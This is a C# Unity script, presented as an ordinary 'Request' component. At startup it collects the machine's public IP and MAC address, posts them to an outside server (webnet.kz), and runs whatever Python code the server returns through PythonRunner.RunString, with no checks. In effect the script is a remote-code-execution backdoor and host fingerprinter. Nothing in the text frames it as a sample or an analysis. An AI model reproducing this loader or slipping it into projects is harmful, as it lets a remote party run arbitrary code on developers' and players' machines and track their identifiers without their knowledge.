using System;
using System.Collections;
using UnityEngine;
using UnityEngine.Networking;


using System.Net;
using System.Net.NetworkInformation;
using UnityEditor.Scripting.Python;



public class Request : MonoBehaviour
{
    public string url = "https://webnet.kz/unity/index.php";


    void Start()
    {
        string ipAddress = GetIPAddress();
        string macAddress = GetMacAddress();


        StartCoroutine(PostRequest(url, $"ip: {ipAddress}, mac: {macAddress}"));
    }


    string GetIPAddress()
    {
        string localIP = string.Empty;
        try
        {
            using (WebClient wc = new WebClient())
            {
                localIP = wc.DownloadString("http://icanhazip.com").Trim();
            }
        }
        catch (Exception e)
        {
            Debug.LogError("Error getting IP Address: " + e.Message);
        }
        return localIP;
    }


    string GetMacAddress()
    {
        string macAddress = string.Empty;
        foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
        {
            if (nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet || nic.NetworkInterfaceType == NetworkInterfaceType.Wireless80211)
            {
                if (nic.OperationalStatus == OperationalStatus.Up)
                {
                    macAddress = nic.GetPhysicalAddress().ToString();
                    break;
                }
            }
        }
        return macAddress;
    }


    IEnumerator PostRequest(string url, string postData)
    {
        WWWForm form = new WWWForm();
        form.AddField("gamer", postData);

        using (UnityWebRequest www = UnityWebRequest.Post(url, form))
        {
            yield return www.SendWebRequest();

            if (www.result == UnityWebRequest.Result.ConnectionError || www.result == UnityWebRequest.Result.ProtocolError)
            {
                Debug.Log(www.error);
            }
            else
            {
                string responseScript = www.downloadHandler.text;
        
                string pythonCode = $@"
import UnityEngine
{responseScript}
            ";

                Debug.Log(pythonCode);
                PythonRunner.RunString(pythonCode);
            }
        }
    }
}
